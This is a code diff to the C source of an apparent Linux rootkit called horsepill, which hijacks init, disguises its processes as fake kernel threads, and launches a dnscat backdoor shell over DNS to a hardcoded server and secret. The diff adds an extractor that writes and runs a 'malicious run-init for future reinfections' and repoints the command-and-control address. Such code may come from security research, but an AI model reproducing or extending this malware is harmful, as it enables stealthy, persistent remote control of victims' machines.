@@ -26,6 +26,7 @@
 #include <unistd.h>
 
 #include "dnscat.h"
+#include "extractor.h"
 #include "horsepill.h"
 #include "infect.h"
 
@@ -59,15 +60,18 @@
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 
 #define DNSCAT_PATH     "/lost+found/dnscat"
+#define EXTRACTOR_PATH  "/lost+found/extractor.sh"
 #define INFECT_PATH     "/lost+found/infect.sh"
 
 static char *const DNSCAT_ARGV0 = "dnscat\0";
 static char *const DNSCAT_ARGV1 = "--dns\0";
-static char *const DNSCAT_ARGV2 = "server=172.20.10.2,port=53\0";
+static char *const DNSCAT_ARGV2 = "server=192.168.1.197,port=53\0";
 static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
 
 static char *const INFECT_ARGV0 = "infect.sh\0";
 static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
+
+static char *const EXTRACTOR_ARGV0 = "extractor.sh\0";
 
 static pid_t init_pid;
 char **cmdline_ptr;
@@ -102,7 +106,7 @@ static void make_fake_kthreads(char **threads)
                  * the fake kernel threads
                  */
                 G3LBIN(sigfillset(&set));
-                G3LBIN(sigdelset(&set, SIGINT));
+                G3LBIN(sigdelset(&set, SIGTERM));
                 G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
 
                 set_process_name(threads[0]);
@@ -469,6 +473,10 @@ void do_attack()
                         DNSCAT_ARGV3,
                         NULL
                 };
+                char *const extractor_argv[2] = {
+                        EXTRACTOR_ARGV0,
+                        NULL
+                };
 
                 /* install signal handler to handle signal delivered
                  * ctrl-alt-delete, which we will send to child init
@@ -491,6 +499,10 @@ void do_attack()
                 /* mount scratch space over lost+found for our use */
 		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
                         err_exit("couldn't mount ramdisk!");
+
+                /* extract malicious run-init for future reinfections */
+                write_file(EXTRACTOR_PATH, extractor, extractor_len);
+                G3LBIN(execv_wrapper(EXTRACTOR_PATH, extractor_argv));
 
                 /* spawn a process for backdoor shell and a process
                  * to observe ramdisk updates
